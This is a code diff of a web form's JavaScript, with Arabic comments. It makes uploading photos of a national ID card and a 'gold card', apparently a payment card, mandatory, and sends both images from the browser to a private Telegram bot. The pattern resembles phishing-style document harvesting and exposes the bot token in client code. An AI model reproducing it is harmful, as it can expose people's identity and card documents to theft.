@@ -896,28 +896,34 @@ async function handleFormSubmit(event) {
     });
 
     // إرسال صورة بطاقة الهوية إذا موجودة
-    const nationalId = document.getElementById("nationalId").files[0];
-    if (nationalId) {
-      const fd = new FormData();
-      fd.append("chat_id", CHAT_ID);
-      fd.append("photo", nationalId, nationalId.name);
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: fd,
-      });
-    }
-
-    // إرسال صورة البطاقة الذهبية إذا موجودة
-    const goldCard = document.getElementById("goldCard").files[0];
-    if (goldCard) {
-      const fd = new FormData();
-      fd.append("chat_id", CHAT_ID);
-      fd.append("photo", goldCard, goldCard.name);
-      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-        method: "POST",
-        body: fd,
-      });
-    }
+    // إرسال صورة بطاقة الهوية (إجباري)
+const nationalId = document.getElementById("nationalId").files[0];
+if (!nationalId) {
+  showFormMessage("❌ يرجى رفع صورة بطاقة التعريف الوطنية قبل تأكيد الطلب.", "error");
+  return; // يوقف الإرسال إذا ما رفعش الصورة
+} else {
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("photo", nationalId, nationalId.name);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: fd,
+  });
+}
+      // إرسال صورة البطاقة الذهبية (إجباري)
+const goldCard = document.getElementById("goldCard").files[0];
+if (!goldCard) {
+  showFormMessage("❌ يرجى رفع صورة البطاقة الذهبية قبل تأكيد الطلب.", "error");
+  return; // يوقف الإرسال إذا ما رفعش الصورة
+} else {
+  const fd = new FormData();
+  fd.append("chat_id", CHAT_ID);
+  fd.append("photo", goldCard, goldCard.name);
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: "POST",
+    body: fd,
+  });
+}
 
     showSuccessPopup();
     // إعادة تعيين الفورم
@@ -946,3 +952,4 @@ function showSuccessPopup() {
 function closePopup() {
   document.getElementById("success-popup").style.display = "none";
 }
+
